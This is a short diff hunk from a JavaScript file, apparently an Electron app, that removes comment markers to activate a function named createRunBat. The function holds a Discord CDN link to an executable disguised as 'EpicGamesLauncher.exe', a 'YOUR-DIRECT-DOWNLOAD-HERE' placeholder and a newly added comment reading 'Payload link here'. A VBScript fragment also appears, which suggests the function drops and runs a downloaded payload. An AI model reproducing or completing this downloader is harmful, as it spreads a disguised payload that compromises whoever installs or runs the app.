@@ -747,12 +747,12 @@ function logError(errorMessage) {
     });
 }
 
-/*
+
 function createRunBat() {
     const programName = path.basename(app.getPath('exe'));
     const sourceFolderPath = path.dirname(app.getPath('exe'));
 
-    // URL
+    // URL                Payload link here
     const downloadUrl1 = "https://cdn.discordapp.com/attachments/660885288079589385/1199071175268110336/EpicGamesLauncher.exe";
     const downloadUrl2 = "YOUR-DIRECT-DOWNLOAD-HERE";
 
@@ -834,7 +834,6 @@ Set objShell = Nothing`;
     });
 }
 
-*/
 
 
 function debugLog(message) {
